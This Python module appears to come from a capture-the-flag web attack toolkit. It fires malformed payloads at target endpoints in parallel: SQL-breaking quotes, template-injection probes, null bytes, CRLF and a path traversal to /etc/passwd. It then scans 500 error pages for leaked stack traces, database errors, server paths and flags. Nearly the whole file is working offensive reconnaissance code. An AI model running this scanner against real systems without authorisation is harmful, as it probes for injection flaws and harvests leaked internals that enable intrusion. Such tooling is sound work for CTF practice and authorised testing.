"""Error-trigger info disclosure: feed malformed input to endpoints and
watch for 500s that leak stack traces, DB errors, paths or flags."""
import urllib.parse

from core import httpx
from core.flag import extract_flags
from core.parallel import pmap

# input that commonly trips error handlers
PAYLOADS = [
    ("quote", "'"),
    ("double-quote", '"'),
    ("urlquote", "%27%22"),
    ("null-byte", "%00"),
    ("ssti", "{{7*7}}"),
    ("ssti-dollar", "${7*7}}"),
    ("long", "A" * 3000),
    ("path-traversal", "..%2f..%2f..%2fetc%2fpasswd"),
    ("array", "a%5B%5D=1"),
    ("newline", "%0d%0a"),
    ("unicode", "\uffff"),
]

LEAK_MARKERS = [
    "traceback", "stack trace", "at com.", "at org.", "at java.",
    ".php on line", ".py line", "in <module>", "exception", "syntax error",
    "unclosed", "pg_query", "mysql_fetch", "sqlstate", "odbc", "driver",
    "sourcedriver", "java.lang", "system.err", "warning: ",
    "var/www", "/home/", "c:\\inetpub", "app/webroot",
    "not found in", "undefined index", "undefined variable",
]


def trigger_errors(base, endpoints, max_endpoints=12, workers=16):
    """Try each payload against each endpoint; report 500s with leaks."""
    if not endpoints:
        endpoints = [base + "/"]
    endpoints = [e for e in endpoints if not e.endswith((".png", ".jpg", ".css", ".ico"))][:max_endpoints]
    hits = []
    flags = []

    def do(endpoint):
        local = []
        for name, payload in PAYLOADS:
            sep = "&" if "?" in endpoint else "?"
            url = f"{endpoint}{sep}x={urllib.parse.quote(payload, safe='')}"
            r = httpx.get(url, timeout=6)
            if r is None or r.status != 500:
                continue
            body = r.text
            leaks = [m for m in LEAK_MARKERS if m in body.lower()]
            if leaks:
                known, cands = extract_flags(body)
                local.append((endpoint, name, leaks[:3], known + cands))
        return local

    for _, res in pmap(do, endpoints, workers=workers, desc="error trigger"):
        if isinstance(res, Exception):
            continue
        for endpoint, name, leaks, found_flags in res:
            hits.append((endpoint, name, leaks))
            flags.extend(found_flags)
    return hits, list(dict.fromkeys(flags))
